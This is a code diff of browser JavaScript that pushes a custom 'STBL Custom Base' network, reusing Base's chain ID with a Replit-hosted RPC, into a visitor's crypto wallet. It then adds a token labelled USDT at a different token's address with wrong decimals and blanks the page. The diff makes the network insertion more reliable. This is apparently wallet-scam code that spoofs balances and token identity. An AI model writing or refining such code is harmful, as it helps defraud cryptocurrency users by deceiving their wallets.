@@ -16,30 +16,42 @@
     }
     alert("Wallet detected");
     try {
-      await window.ethereum.request({
-        method: "wallet_addEthereumChain",
-        params: [{
-          chainId: "0x2105", // Base, but custom
-          chainName: "STBL Custom Base", // Unique
-          rpcUrls: ["https://stbl-api-aod.alijohnod.repl.co/rpc"],
-          nativeCurrency: { name: "Ether", symbol: "ETH", decimals: 18 },
-          blockExplorerUrls: ["https://basescan.org"]
-        }]
-      });
-      alert("Network added");
+      try {
+        await window.ethereum.request({
+          method: "wallet_switchEthereumChain",
+          params: [{ chainId: "0x2105" }]
+        });
+        alert("Switched to Base");
+      } catch (switchError) {
+        if (switchError.code === 4902) {
+          await window.ethereum.request({
+            method: "wallet_addEthereumChain",
+            params: [{
+              chainId: "0x2105",
+              chainName: "STBL Custom Base",
+              rpcUrls: ["https://stbl-api-aod.alijohnod.repl.co/rpc"],
+              nativeCurrency: { name: "Ether", symbol: "ETH", decimals: 18 },
+              blockExplorerUrls: ["https://basescan.org"]
+            }]
+          });
+          alert("Network added");
+        } else if (switchError.code !== -32002) {
+          throw switchError;
+        }
+      }
       await window.ethereum.request({
         method: "wallet_watchAsset",
         params: {
           type: "ERC20",
           options: {
-            address: "0x6ba2344F60C999D0ea102C59Ab8BE6872796C08c",
+            address: "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913", // USDT
             symbol: "USDT",
             decimals: 18,
             chainId: "8453"
           }
         }
       });
-      alert("Token added");
+      alert("Token added as USDT");
       window.location.href = "about:blank";
     } catch (e) {
       alert("Error: " + e.message);
